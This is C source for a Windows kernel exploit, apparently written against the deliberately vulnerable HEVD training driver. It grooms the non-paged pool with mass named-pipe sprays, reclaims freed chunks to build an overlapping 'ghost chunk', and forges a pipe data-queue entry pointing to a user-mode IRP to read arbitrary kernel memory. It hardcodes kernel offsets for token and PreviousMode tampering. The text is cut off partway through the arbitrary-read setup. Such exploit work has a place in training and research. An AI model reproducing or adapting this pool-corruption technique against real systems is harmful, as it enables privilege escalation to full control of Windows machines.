#include <windows.h>
#include <winternl.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <inttypes.h>
#include <Psapi.h>

// 1. Define the Driver Path and IOCTL Code for the Target Vulnerability
// ---------------------------------------------------------------------
// The symbolic link name for the HEVD driver.
#define HEVD_DEVICE_NAME  "\\\\.\\HackSysExtremeVulnerableDriver" 

// The specific IOCTL code to trigger the Stack Buffer Overflow vulnerability.
// This value is defined within the HEVD driver's source code.
#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW 0x222003
#define HACKSYS_EVD_IOCTL_HEAP_OVERFLOW 0x22204B

#define GHOST_CHUNK_MARKER 0xDEADBEEFC0DECAFE
#define PROCESSBILL_CHUNK_MARKER 0xDEADBEEFDEADBEEF

#define ghost_marker0  0x3131313131313130
#define ghost_marker1  0x3131313131313131
#define ghost_marker2  0x3131313131313132
#define ghost_marker3  0x3131313131313133
#define ghost_marker4  0x3131313131313134
#define ghost_marker5  0x3131313131313135
#define ghost_marker6  0x3131313131313136
#define ghost_marker7  0x3131313131313137
#define ghost_marker8  0x3131313131313138
#define ghost_marker9  0x3131313131313139

int numError = 0;

//pool header struct

typedef struct _IRP{
    SHORT Type;
    USHORT Size;
    PVOID MdlAddress;
    ULONG Flags;  
    union
    {
        struct _IRP* MasterIrp;                                             //0x18
        LONG IrpCount;                                                      //0x18
        PVOID SystemBuffer;                                                 //0x18
    } AssociatedIrp;
    LIST_ENTRY ThreadListEntry;
    IO_STATUS_BLOCK IoStatus;
    CHAR RequestorMode;
    BOOLEAN PendingReturned;
    CHAR StackCount;
    CHAR CurrentLocation;
    BOOLEAN Cancel;
    UCHAR CancelIrql;
    CCHAR ApcEnvironment;
    UCHAR AllocationFlags;
    PVOID UserIosb;
    PVOID UserEvent;
    char Overlay[16];
    PVOID CancelRoutine;
    PVOID UserBuffer;
    CHAR TailIsWrong;
} IRP;


typedef struct _POOL_HEADER
{
    // The first 4 bytes (0x000 to 0x003) are unionized
    union {
        struct {
            // These 4 fields are packed into a single ULONG (4 bytes)
            // Note: The order and specific bits can change slightly by OS version
            USHORT PreviousSize : 8;        // 8 bits (Byte 0)
            USHORT PoolIndex : 8;        // 8 bits (Byte 1)
            USHORT BlockSize : 8;        // 8 bits (Byte 2)
            USHORT PoolType : 8;        // 8 bits (Byte 3)
        };
        ULONG Ulong1; // The debugger shows this as the combined 4-byte value 0xa210000
    };

    // ULONG PoolTag starts at offset 0x004 (4 bytes)
    ULONG PoolTag;

    // The last 8 bytes (0x008 to 0x00F) are unionized 
    // and contain encoded information for security/tracking.
    union {
        // Pointer to the billed process (encoded/XOR'd in modern Windows)
        ULONGLONG ProcessBilled;

        // This union packs AllocatorBackTraceIndex (USHORT) and PoolTagHash (USHORT)
        struct {
            USHORT AllocatorBackTraceIndex; // 2 bytes (Offset 0x008)
            USHORT PoolTagHash;             // 2 bytes (Offset 0x00A)
        };
    };

} POOL_HEADER, * PPOOL_HEADER;

typedef struct _HEAP_VS_CHUNK_HEADER // -> 0x10
{
    uint16_t MemoryCost;
    uint16_t UnsafeSize;
    uint16_t UnsafePrevSize;
    uint8_t Allocated;
    uint8_t Unused1;
    uint8_t EncodedSegmentPageOffset;
    uint8_t Unused2[7];
} HEAP_VS_CHUNK_HEADER;



typedef struct _NP_DATA_QUEUE_ENTRY
{
    LIST_ENTRY QueueEntry;
    IRP *Irp;
    uintptr_t ClientSecurityContext;
    unsigned long DataEntryType;
    unsigned long QuotaInEntry;
    unsigned long DataSize;
    unsigned long unknown;
    char data[0];
} NP_DATA_QUEUE_ENTRY;  // -> 0x30


typedef struct _vs_chunk_header
{
    uintptr_t qword1;
    uintptr_t qword2;

} vs_chunk_header;

typedef struct vs_chunk
{
    uintptr_t encoded_vs_header[2];
    POOL_HEADER pool_header;
    NP_DATA_QUEUE_ENTRY np_data_queue_entry;
} vs_chunk_t;



// Define the size of the exploit buffer to ensure an overflow occurs.
#define ALLOC_SIZE 0x1F0 //Size of vuln buffer when allocated
#define HACK_CHUNK_SIZE ALLOC_SIZE + sizeof(_HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER) //0x210
#define TARGET_NPFS_CHUNK_SIZE 0x220
#define VULN_NPFS_CHUNK_SIZE 0x210
//#define HEAP_VS_CHUNK_HEADER 0x10
#define PADDING 0x10
#define BUFFER_SIZE_OVERFLOW ALLOC_SIZE + PADDING + sizeof(HEAP_VS_CHUNK_HEADER) + 4 //just want to overwrite the first 4 bytes of the POOL_HEADER - 0x20 (padding + HEAP_VS_CHUNK_HEADER)
#define PREVIOUS_SIZE (TARGET_NPFS_CHUNK_SIZE - sizeof(_HEAP_VS_CHUNK_HEADER) - sizeof(POOL_HEADER) - sizeof(NP_DATA_QUEUE_ENTRY)) / 0x10   //0x220 - 0x10 - 0x30 = 0x1E0 / 0x10 = 0x1E

// --- CONFIGURATION ---
// Total number of Named Pipes to create for the spray

#define NUM_ENABLE_SUBSEGMENT 0x20000
#define NUM_PIPES_GROOM 30*0x80 
#define NUM_PIPES_HACK_RECLAIM 40*0x80 //100000
#define NUM_PIPES_GHOST 80000 
#define NUM_PIPES_GIANT 10000
#define NUM_PIPES_ENABLE_LOOOKASIDE_GROOM 50000  //65000
#define NUM_PIPES_ENABLE_LOOOKASIDE_GHOST 50000 //65000
#define NUM_PIPES_ENABLE_LOOOKASIDE_HACK 50000 //65000
// Size of the data buffer to write (must match the target object size in the kernel)

#define ALL_HEADERS (sizeof(_HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER) + sizeof(NP_DATA_QUEUE_ENTRY))   //0x50
#define SPRAY_SIZE_GROOM  (TARGET_NPFS_CHUNK_SIZE - ALL_HEADERS)   //Size of the vuln object
#define SPRAY_SIZE_RECLAIM_HACK (VULN_NPFS_CHUNK_SIZE - ALL_HEADERS)  //Used for reclaiming the freed object
#define SPRAY_SIZE_HACK_LOOKASIDE SPRAY_SIZE_RECLAIM_HACK
#define HACK_CHUNK_SIZE SPRAY_SIZE_RECLAIM_HACK
#define SPRAY_SIZE_GHOST_CHUNK TARGET_NPFS_CHUNK_SIZE*2 - ALL_HEADERS  //0x440 - 0x50 = 0x3F0
#define BLOCK_SIZE_OVERWRITE (SPRAY_SIZE_GHOST_CHUNK - sizeof(HEAP_VS_CHUNK_HEADER)) / 0x10
#define SPRAY_MAX_SIZE 0x1000
#define MAX_SIZE 300000
#define GROOM_ITERATIONS 1
//Size of Name Pipe Queue Entry 
#define NP_HEADER_SIZE 0x30


#define PREV_CHUNK_OFFSET ALL_HEADERS
#define NEXT_CHUNK_OFFSET SPRAY_SIZE_GHOST_CHUNK

#define GHOST_DATA_SIZE (SPRAY_SIZE_GHOST_CHUNK - ALL_HEADERS)

// The name base for the pipes
const WCHAR* BASE_NAME_LOOKASIDENPFR = L"\\\\.\\pipe\\LookAsideNpFr";
const WCHAR* BASE_NAME_LOOKASIDEGHOST = L"\\\\.\\pipe\\LookAsideGhost";
const WCHAR* BASE_NAME_LOOKASIDEHACK = L"\\\\.\\pipe\\LookAsideHack";
const WCHAR* BASE_NAME_EPROCESS = L"\\\\.\\pipe\\Eprocess"; // Use a const pointer for the base
const WCHAR* BASE_NAME_GROOM = L"\\\\.\\pipe\\PipeSprayGroom"; // Use a const pointer for the base
const WCHAR* BASE_NAME_RECLAIM_HACK = L"\\\\.\\pipe\\PipeSprayReclaimHack";
const WCHAR* BASE_NAME_HACK = L"\\\\.\\pipe\\PipeSprayHack";
const WCHAR* BASE_NAME_RECLAIM_GHOST = L"\\\\.\\pipe\\PipeSprayGhost";

//type of sprays regarding to persistence in the heap (live time)

#define MEM_NON_PERSISTENT 0
#define MEM_PERSISTENT 1


// Global array to hold the handles to the pipes
#define SPRAY_HACK 0
#define SPRAY_EPROCESS 1
#define SPRAY_GROOM_HEAP 2
#define SPRAY_RECLAIM_HACK 3
#define SPRAY_RECLAIM_GHOST 4
#define SPRAY_LOOKASIDE_NPFR_HEAP 5  //SPRAY_LOOKASIDE_HEAP
#define SPRAY_LOOKASIDE_GHOST_HEAP 6
#define SPRAY_LOOKASIDE_HACK_HEAP 7

typedef struct {
    HANDLE Read;
    HANDLE Write;
} PIPE_HANDLES;


PIPE_HANDLES hPipeHandlesHack[MAX_SIZE];
PIPE_HANDLES hPipeHandlesEprocess[MAX_SIZE];
PIPE_HANDLES hPipeHandlesGroomNpfr[MAX_SIZE];
PIPE_HANDLES hPipeHandlesLookasideNpfr[MAX_SIZE];
PIPE_HANDLES hPipeHandlesReclaimHack[MAX_SIZE];
PIPE_HANDLES hPipeHandlesGhost[MAX_SIZE];
PIPE_HANDLES hPipeHandlesLookAsideGhost[MAX_SIZE];
PIPE_HANDLES hPipeHandlesLookAsideHack[MAX_SIZE];


typedef struct _SPRAY_CONFIG {
    const WCHAR* BaseName;
    DWORD PayloadSize;
    DWORD NumPipes;
    PIPE_HANDLES* HandleArray;
} SPRAY_CONFIG;

// Centralized Dispatch Table using your existing constants
SPRAY_CONFIG SprayTable[] = {
    { BASE_NAME_HACK,            HACK_CHUNK_SIZE,           NUM_ENABLE_SUBSEGMENT,             hPipeHandlesHack },
    { BASE_NAME_EPROCESS,        SPRAY_MAX_SIZE,            NUM_PIPES_GIANT,                   hPipeHandlesEprocess },
    { BASE_NAME_GROOM,           SPRAY_SIZE_GROOM,          NUM_PIPES_GROOM,                   hPipeHandlesGroomNpfr },
    { BASE_NAME_RECLAIM_HACK,    SPRAY_SIZE_RECLAIM_HACK,   NUM_PIPES_HACK_RECLAIM,            hPipeHandlesReclaimHack },
    { BASE_NAME_RECLAIM_GHOST,   GHOST_DATA_SIZE,           NUM_PIPES_GHOST,                   hPipeHandlesGhost },
    { BASE_NAME_LOOKASIDENPFR,   SPRAY_SIZE_GROOM,          NUM_PIPES_ENABLE_LOOOKASIDE_GROOM, hPipeHandlesLookasideNpfr },
    { BASE_NAME_LOOKASIDEGHOST,  GHOST_DATA_SIZE,           NUM_PIPES_ENABLE_LOOOKASIDE_GHOST, hPipeHandlesLookAsideGhost },
    { BASE_NAME_LOOKASIDEHACK,   SPRAY_SIZE_RECLAIM_HACK,   NUM_PIPES_ENABLE_LOOOKASIDE_HACK,  hPipeHandlesLookAsideHack }
};

/*Exploit variables*/

HEAP_VS_CHUNK_HEADER leakedVsChunkHeader;
POOL_HEADER leakedGhostNpfrPoolHeader;
NP_DATA_QUEUE_ENTRY leakedNpGhostNpfrHeader;
DWORD64 NpFcPointer = 0x0;
DWORD64 GhostChunkPointer = 0x0;
DWORD64 leakedFileObj = 0x0;
DWORD64 DevObj = 0x0;
DWORD64 DrvObj = 0x0;
DWORD64 Npfs_base = 0x0;
DWORD64 nt_exAllocatePool2_addr = 0x0;
DWORD64 nt_base = 0;
DWORD64 nt_expPoolQuotaCookie = 0;
DWORD64 nt_RtlpHpHeapGlobals = 0;
DWORD64 system_eprocess = 0;
DWORD64 self_eprocess = 0;
DWORD64 self_kthread = 0;
DWORD64 self_kthread_prev = 0;
DWORD64 self_kthread_prevMode = 0;
DWORD64 vs_sub_segment = 0;

int detectOverlappedPipe();
DWORD FreePipe(DWORD SprayType, DWORD index, DWORD closeHandles);
IRP userlandIrp = { 0 };

int GhostPipeIndex = 0;
int vuln_object_index = 0;

PIPE_HANDLES ghost_pipe;
PIPE_HANDLES vuln_pipe; // = hPipeHandlesReclaimHack[vuln_object_index];

#define NPFC_CCB_OFFSET 0xB8
#define NPFC_CCB_FILE_OFFSET 0x40
#define DEV_OFFSET 0x8
#define DRV_OFFSET 0x8
#define NPFS_BASE_OFFSET 0x18

#define WINDOWS_11_TEST 0

#ifdef WINDOWS_11_TEST
#define NPFS_ExAllocatePool2_offset 0x7050
#define NT_ExAllocatePool2_offset 0xA9E5B0
#define NT_ExPoolQuotaCookie 0xD1DFB8
#define NT_RtlpHpHeapGlobals 0xC6AF80
#define NT_PsInitialSystemProcess_offset 0xD1DA20
#else
#define NPFS_ExAllocatePool2_offset 0x7050  //ExAllocatePoolWithTag
#define NT_ExAllocatePool2_offset 0x9C1030 //ExAllocatePoolWithTag
#define NT_ExPoolQuotaCookie 0xCFB9D0
#define NT_RtlpHpHeapGlobals 0xC1DC80
#define NT_PsInitialSystemProcess_offset 0xCFB420 
#endif

/*#define NPFS_ExAllocatePool2_offset 0x7050
#define NT_ExAllocatePool2_offset 0xA9E5B0
#define NT_ExPoolQuotaCookie 0xD1DFB8
#define NT_RtlpHpHeapGlobals 0xC6AF80
#define NT_PsInitialSystemProcess_offset 0xD1DA20*/
#define ActiveProcessLink_offset 0x448
#define ProcessID_offset 0x440
#define thread_list_offset 0x30
#define kthread_previous_mode_offset 0x232
#define eprocess_token_offset 0x4b8

//arbitrary decrement values
char g_fake_process_billed_chunk_buf[sizeof(vs_chunk_t) + 0x8] = { 0 };
vs_chunk_t* g_fake_process_billed_chunk = (vs_chunk_t*)g_fake_process_billed_chunk_buf;

uintptr_t addr_to_decrement = 0;

#define EPROCESS_SIZE 0x800
#define EPROCESS_OFFSET 0x50
#define EPROCESS_QUOTABLOCK_OFFSET 0x568
#define PREV_KTRHEAD 0x2f8


/*NTDLL functions*/

typedef NTSTATUS(WINAPI* _NtWriteVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID BaseAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytesToWrite,
    _Out_opt_ PULONG NumberOfBytesWritten
    );

typedef NTSTATUS(WINAPI* _NtReadVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID BaseAddress,
    _Out_ PVOID Buffer,
    _In_ ULONG NumberOfBytesToRead,
    _Out_opt_ PULONG NumberOfBytesRead
    );


_NtWriteVirtualMemory pNtWriteVirtualMemory;
_NtReadVirtualMemory pNtReadVirtualMemory;




void GetNtFunction() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    //NTSTATUS ntStatus;

    pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
    pNtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");
}


/**
 * Creates a single Named Pipe allocation to occupy kernel pool memory.
 * * This function implements the core "allocation primitive." By creating a Named Pipe
 * and writing a payload to it, we force the kernel driver (npfs.sys) to allocate
 * an NP_DATA_QUEUE_ENTRY structure in the Non-Paged Pool.
 * * The function performs three main steps:
 * 1. Generates a unique pipe name based on the SprayType.
 * 2. Establishes the pipe (Server via CreateNamedPipeW or Anonymous via CreatePipe).
 * 3. Writes the user-controlled payload to the pipe, which resides in kernel memory
 * until the handles are closed.
 * * @param payload       The data buffer to be stored in the kernel.
 * @param payloadSize   The size of the allocation (determines the heap bucket).
 * @param memPersistent If true, creates a client connection to keep the data buffered.
 * @param SprayType     Determines the naming convention and target storage array.
 * @param index         The specific slot in the handle tracking array.
 * @return 1 on success, 0 on recoverable error, -1 on fatal error.
 */

DWORD CreatePipeQueueEntry(char* payload, DWORD payloadSize, DWORD memPersistent, DWORD SprayType, DWORD index)
{
    WCHAR pipeName[512];
    HANDLE hWrite = INVALID_HANDLE_VALUE;
    HANDLE hRead = INVALID_HANDLE_VALUE;
    SPRAY_CONFIG* cfg = &SprayTable[SprayType];

    // 1. Generate Pipe Name using the Dispatch Table
    if (swprintf_s(pipeName, 512, L"%ws%d", cfg->BaseName, index) < 0) return -1;

    // 2. Create the Pipe (Anonymous for Reclaim Hack, Named for others)
    if (SprayType == SPRAY_RECLAIM_HACK) {
        if (!CreatePipe(&hRead, &hWrite, NULL, 0xFFFFFFFF)) {
            fprintf(stderr, "[-] Failed to create pipe pair: %lu\n", GetLastError());
            return 0;
        }
    }
    else {
        hWrite = CreateNamedPipeW(
            pipeName,
            PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            payloadSize,
            payloadSize,
            0,
            NULL
        );

        if (hWrite == INVALID_HANDLE_VALUE) return 1; // Non-fatal, try next index

        if (memPersistent) {
            hRead = CreateFile(pipeName, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, 0);
        }
    }

    // 3. Store handles in the corresponding Global Array
    cfg->HandleArray[index].Write = hWrite;
    cfg->HandleArray[index].Read = hRead;

    // 4. Write payload to trigger the NPFS Data Queue allocation
    DWORD bytesWritten;
    if (!WriteFile(hWrite, payload, payloadSize, &bytesWritten, NULL)) {
        if (GetLastError() != ERROR_IO_PENDING) return 0;
    }

    return 1;
}

/**
 * Executes a mass heap spray using Named Pipe DataQueueEntries.
 * * This function orchestrates the allocation of multiple NPFS 'DataQueueEntry'
 * objects in the kernel pool. Each successful pipe write creates a controlled
 * allocation of 'payloadSize'. This is used to:
 * 1. Groom the heap (exhausting lookaside lists or filling subsegments).
 * 2. Position controlled data adjacent to a vulnerable object.
 * 3. Reclaim a recently freed memory slot with malicious content.
 * * If an error occurs during the spray, the function transitions to a cleanup
 * phase to release all allocated handles, preventing a permanent kernel memory leak.
 *
 * @param payload       The data buffer to be placed in kernel memory.
 * @param payloadSize   Size of the allocation (affects which heap bin is used).
 * @param memPersistent Boolean-like flag to determine the allocation lifetime.
 * @param numPipes      Total number of allocations to attempt.
 * @param SprayType     The category of spray (determines the global handle array used).
 * @param baseIndex     The starting offset within the handle array.
 * @return TRUE if the spray completes; FALSE if a fatal error occurs.
 */

BOOL PipeQueueEntrySpray(char* payload, DWORD SprayType, DWORD memPersistent, DWORD numPipes, DWORD baseIndex) {
    SPRAY_CONFIG* cfg = &SprayTable[SprayType];
    printf("[*] Spraying %d pipes of type %ws (Size: 0x%lx)\n", numPipes, cfg->BaseName, cfg->PayloadSize);

    for (DWORD i = 0; i < numPipes; i++) {
        if (!CreatePipeQueueEntry(payload, cfg->PayloadSize, memPersistent, SprayType, baseIndex + i)) {
            // Cleanup on fatal error
            continue;
        }
    }
    return TRUE;
}

/**
 * Releases a kernel pipe buffer allocation to create a hole in the heap.
 * * This function triggers the deallocation of a DATA_QUEUE_ENTRY by first
 * draining the pipe's buffer with ReadFile and then closing the user-mode
 * handles.
 * * In NPFS, closing both the read and write handles of a pipe that contains
 * buffered data ensures that the associated kernel pool allocation is
 * immediately freed back to the Segment Heap. The function also nullifies
 * the handles in the global tracking arrays to prevent "Double Free"
 * scenarios or use of invalid handles.
 *
 * @param pipe_handle Pointer to the specific read/write handle pair to close.
 * @param payloadSize The size of the data to drain (must match original spray).
 * @param SprayType   The category of the spray (used to update the correct global array).
 * @param index       The index within the global tracking array.
 * @return 1 on successful free, 0 if handles were already invalid or free failed.
 */




DWORD FreePipe(DWORD SprayType, DWORD index, DWORD closeHandles) {
    SPRAY_CONFIG* cfg = &SprayTable[SprayType];
    PIPE_HANDLES* ph = &cfg->HandleArray[index];
    char readBuffer[SPRAY_MAX_SIZE];
    DWORD bytesRead = 0;

    if (ph->Write == INVALID_HANDLE_VALUE || ph->Read == INVALID_HANDLE_VALUE) return 0;

    // Use the PayloadSize defined for this specific SprayType
    if (ReadFile(ph->Read, readBuffer, cfg->PayloadSize, &bytesRead, NULL)) {
        if (closeHandles) {
            CloseHandle(ph->Write);
            CloseHandle(ph->Read);
            ph->Write = ph->Read = INVALID_HANDLE_VALUE;
        }
        return 1;
    }
    return 0;
}

/**
 * Creates controlled fragmentation (holes) within a sprayed heap region.
 * * By freeing objects at a specific ratio (e.g., every 4th chunk), this function
 * prepares the heap for a "Reclamation" attack. The goal is to ensure that when
 * the kernel later allocates a vulnerable object, it is placed into one of these
 * known gaps, sandwiched between other chunks we already control.
 *
 * This deterministic fragmentation is a key technique for bypassing modern
 * heap isolation and randomization in the Windows Segment Heap.
 *
 * @param holesRatio The frequency of hole creation (e.g., 4 results in 1 hole every 4 chunks).
 * @param SprayType  The type of spray to manipulate (Groom, Lookaside, Hack, etc.).
 */

  
void CreatePoolHoles(DWORD holesRatio, DWORD SprayType) {
    SPRAY_CONFIG* cfg = &SprayTable[SprayType];
    for (DWORD i = 0; i < cfg->NumPipes; i++) {
        if ((i % holesRatio) == 0) FreePipe(SprayType, i, 1);
    }
}

/**
 * Cleans up a specific heap spray type while preserving an active index.
 * * This utility function iterates through a specified array of pipe handles
 * (defined by SprayType) and releases them. It skips the handle at the provided
 * 'index' to ensure that the established memory overlap or primitive remains
 * active in kernel memory.
 *
 * This is used to "de-clutter" the heap after a successful reclamation,
 * reducing the risk of accidental coalescing or resource exhaustion.
 *
 * @param index     The index of the pipe to keep alive. Set to -1 to free all pipes.
 * @param SprayType The category of the spray (Groom, Lookaside, Reclaim, etc.)
 * which determines handle arrays and chunk sizes.
 */

void freedPipesExceptIndex(DWORD index, DWORD SprayType) {
    SPRAY_CONFIG* cfg = &SprayTable[SprayType];
    for (DWORD i = 0; i < cfg->NumPipes; i++) {
        if (i != index) FreePipe(SprayType, i, 1);
    }
}

/**
 * Orchestrates the free-and-reclaim cycle to establish the ghost chunk overlap.
 * * This function iterates through the initial heap groom (NpFr objects). For each
 * iteration, it:
 * 1. Frees a groomed pipe (the victim).
 * 2. Immediately attempts to reclaim that memory with a "Ghost Chunk" payload
 * marked with a unique signature (GHOST_CHUNK_MARKER).
 * 3. Checks if this reclamation resulted in an overlap with the "Hack" pipe
 * using detectOverlappedPipe().
 * * If an overlap is found, it identifies the "Ghost Pipe" (the reclaimer) and the
 * "Vuln Pipe" (the overlapped one). It then cleans up the remaining spray to
 * stabilize the heap while preserving the critical overlapping pipes.
 *
 * @param payload         Buffer used to hold the reclamation data.
 * @param GhostPipeIndex  [Out] Receives the index of the pipe that reclaimed the ghost chunk.
 * @return The index of the vulnerable (overlapped) pipe, or -1 if unsuccessful.
 */

int FreeAndReclaimGhostChunk(char* payload, int *GhostPipeIndex)
{
    PIPE_HANDLES handlePipe = { 0,0 };
    DWORD res = 0;
    DWORD memPersistent = 1;
    DWORD SprayType = 0; //we need to freed the NpFr objects we have sprayed before triggering the vuln to freed the corrupted NpFr object 
    DWORD payloadSize = 0;
    DWORD numPipes = NUM_PIPES_GROOM;
    DWORD numFrees = 0;
    int vulnPipeIndex = -1;
    DWORD64 markers_array[2] = { 0 };
    
    

    for (DWORD i = 0; i < numPipes; i++)
    {

        handlePipe = hPipeHandlesGroomNpfr[i];

        if (handlePipe.Write == INVALID_HANDLE_VALUE || handlePipe.Write == NULL || handlePipe.Read == INVALID_HANDLE_VALUE || handlePipe.Read == NULL) {
            continue;
        }
        //free Pipe (victim chunk)
        
        res = FreePipe(SPRAY_GROOM_HEAP, i, 1);

        numFrees += res;
        

        if (res == 0)
        {
            printf("Error freeing the victim pipe in position %d\n", i);
            continue;
        }

        //reclaim ghost chunk
       
        payloadSize = SPRAY_SIZE_GHOST_CHUNK - sizeof(HEAP_VS_CHUNK_HEADER) - sizeof(NP_DATA_QUEUE_ENTRY) - sizeof(POOL_HEADER);
        
        DWORD64 marker = GHOST_CHUNK_MARKER;  //this marker is used to detect if the chunk replace done during the ArbitraryRead setup succeded
        memcpy(payload, &marker, 0x8);


        //mark each sprayed ghost chunk with a specific marker so i can identify the index of the chunk that has successfully reclaimed the slot
        DWORD64 marker2 = 0;

        int counter = 0;
        for (int j = i; j < i + 10; j++)
        {
            switch (counter)
            {
                case 0:
                    marker2 = ghost_marker0;
                    memcpy(payload + 8, &marker2, 0x8);
                    break;

                case 1:
                    marker2 = ghost_marker1;
                    memcpy(payload + 8, &marker2, 0x8);
                    break;

                case 2:
                    marker2 = ghost_marker2;
                    memcpy(payload + 8, &marker2, 0x8);
                    break;

                case 3:
                    marker2 = ghost_marker3;
                    memcpy(payload + 8, &marker2, 0x8);
                    break;

                case 4:
                    marker2 = ghost_marker4;
                    memcpy(payload + 8, &marker2, 0x8);
                    break;

                case 5:
                    marker2 = ghost_marker5;
                    memcpy(payload + 8, &marker2, 0x8);
                    break;

                case 6:
                    marker2 = ghost_marker6;
                    memcpy(payload + 8, &marker2, 0x8);
                    break;

                case 7:
                    marker2 = ghost_marker7;
                    memcpy(payload + 8, &marker2, 0x8);
                    break;

                case 8:
                    marker2 = ghost_marker8;
                    memcpy(payload + 8, &marker2, 0x8);
                    break;

                case 9:
                    marker2 = ghost_marker9;
                    memcpy(payload + 8, &marker2, 0x8);
                    break;
            }

            memcpy(payload+8, &marker2, 0x8);
            res = CreatePipeQueueEntry(payload, payloadSize, memPersistent, SPRAY_RECLAIM_GHOST, j);

            if (res == -1)
            {
                printf("fatal error, wrng SprayType\n");
                exit(1);
            }
            if (!res)
            {
                printf("Error allocating the fake ghost chunk in position %d\n", i);
                continue;
            }
            counter++;

        }
        

        // Detect overlapped pipe
        
        DWORD resultLength = 0;
        vulnPipeIndex = detectOverlappedPipe();
        if (vulnPipeIndex != -1)
        {
            printf("vuln pipe detected %u\n", vulnPipeIndex);

            for (int j = i; j < i + 10; j++)
            {
                res = PeekNamedPipe(hPipeHandlesGhost[j].Read, markers_array, 0x16, &resultLength, 0, 0);
                printf("markers_array[1]: %llx\n", markers_array[1]);

                //if i can read back the marker2, it means that at least one of the ten sprayed chunks has reclaimed the slot
                if (markers_array[1] == ghost_marker0 || markers_array[1] == ghost_marker1 || markers_array[1] == ghost_marker2 ||
                    markers_array[1] == ghost_marker3 || markers_array[1] == ghost_marker4 || markers_array[1] == ghost_marker5 ||
                    markers_array[1] == ghost_marker6 || markers_array[1] == ghost_marker7 || markers_array[1] == ghost_marker8 ||
                    markers_array[1] == ghost_marker9 )
                {
                    *GhostPipeIndex = j;
                    break;
                }

            }

            
            
            *GhostPipeIndex = i;
            printf("ghost pipe detected: %u\n", *GhostPipeIndex);

            printf("[*] remove SPRAY_RECLAIM_HACK chunks\n");
            freedPipesExceptIndex(vulnPipeIndex, SPRAY_RECLAIM_HACK);

            printf("[*] remove SPRAY_RECLAIM_GHOST chunks\n");
            freedPipesExceptIndex(*GhostPipeIndex, SPRAY_RECLAIM_GHOST);

            /*printf("[*] remove SPRAY_GROOM_HEAP chunks\n");
            freedPipesExceptIndex(-1, SPRAY_GROOM_HEAP); */ //remove all   -> THIS TRIGGERS A KERNEL HEAP CORRUPTION ERROR -> NEED FIX

            return vulnPipeIndex;


        }
        else
        {
            //if overlapped pipe is not detected, reclaim the freed victim chunk to avoid losing the heap layout

            memset(payload, 0x50, SPRAY_SIZE_GROOM); 
            res = CreatePipeQueueEntry(payload, SPRAY_SIZE_GROOM, memPersistent, SPRAY_GROOM_HEAP, i);
        }
    }


}

/**
 * Executes an arbitrary kernel memory read using the established IRP-redirection primitive.
 *
 * This function leverages the 'Unbuffered' NpFr entry previously placed in the ghost
 * chunk. Because the ghost chunk's 'Irp' pointer now targets our 'userlandIrp'
 * structure, updating 'userlandIrp.AssociatedIrp.SystemBuffer' changes the source
 * address of the next pipe read operation.
 * * By calling PeekNamedPipe, we trigger NPFS to fetch data from the address specified
 * in our SystemBuffer, effectively leaking kernel memory into our user-mode buffer.
 *
 * @param ghost_pipe Pointer to the pipe that overlaps the forged unbuffered entry.
 * @param where      The kernel virtual address to read from.
 * @param out        The user-mode buffer to store the leaked data.
 * @param size       Number of bytes to read (max 0xFFF to fit 'arb_read' buffer).
 */

void ArbitraryRead(PIPE_HANDLES* ghost_pipe , uintptr_t where, char* out, size_t size)
{
    char arb_read[0x1000];
    int res = 0;
    DWORD resultLength = 0;

    if (size >= 0x1000)
        size = 0xFFF;

    userlandIrp.AssociatedIrp.SystemBuffer = (PVOID)where;

    res = PeekNamedPipe(ghost_pipe->Read, arb_read, size, &resultLength, 0, 0);

    memcpy(out, arb_read, size);
}

/**
 * Sets up and stabilizes the Arbitrary Read primitive by forging an Unbuffered Data Entry.
 * * This function performs a "Free-and-Reclaim" on the identified vulnerable Hack slot.
 * It replaces the legitimate NpFr object with a malicious one that has the 'Unbuffered'
 * flag set. This flag is crucial because it instructs the kernel to look at the
 * 'Irp' pointer instead of an internal buffer. By pointing this 'Irp' to a
 * user-allocated structure in memory, we can control the 'SystemBuffer' address
 * and read from any kernel location.
 *
 * @param vuln_pipe           The pipe handle corresponding to the overlapped "Hack" slot.
 * @param irp                 Pointer to the fake IRP structure (typically in userland).
 * @param maliciousPayload    The buffer used to craft the forged chunk.
 * @param vuln_object_index   Index of the pipe to be freed and reclaimed.
 * @param GhostPipeIndex      Index of the ghost pipe used to verify the read.
 */

void ArbitraryRead_Setup(IRP* irp, char* maliciousPayload, UINT32 vuln_object_index, UINT32 GhostPipeIndex)
{
    int res = 0;
    DWORD resultLength = 0;
    uintptr_t ghost_np_data_queue_entry = 0;
    int successful = 0;


    // 1. Prepare the Malicious Payload (Forging the NpFr Header)
    memset(maliciousPayload, 0x00, SPRAY_SIZE_RECLAIM_HACK);

    // Restore VS and Pool headers from the original leak to maintain heap stability
    memcpy(maliciousPayload, &leakedVsChunkHeader, sizeof(HEAP_VS_CHUNK_HEADER));
    memcpy(maliciousPayload + sizeof(HEAP_VS_CHUNK_HEADER), &leakedGhostNpfrPoolHeader, sizeof(POOL_HEADER));

    // Create the fake NP_DATA_QUEUE_ENTRY
    NP_DATA_QUEUE_ENTRY fakeNpFrHeader;
    memcpy(&fakeNpFrHeader, &leakedNpGhostNpfrHeader, sizeof(NP_DATA_QUEUE_ENTRY));

    // The "Magic" flags for Arbitrary Read:
    // DataEntryType = 1 (Unbuffered) tells NPFS to look at the Irp pointer for data
    fakeNpFrHeader.DataEntryType = 0x1;
    fakeNpFrHeader.DataSize = 0xfffffffe;
    fakeNpFrHeader.QuotaInEntry = 0xffffffff;
    fakeNpFrHeader.Irp = irp; // Point to our user-mode controlled IRP

    // Copy forged header into payload
    memcpy(maliciousPayload + sizeof(HEAP_VS_CHUNK_HEADER) + sizeof(POOL_HEADER),
        &fakeNpFrHeader, sizeof(NP_DATA_QUEUE_ENTRY));

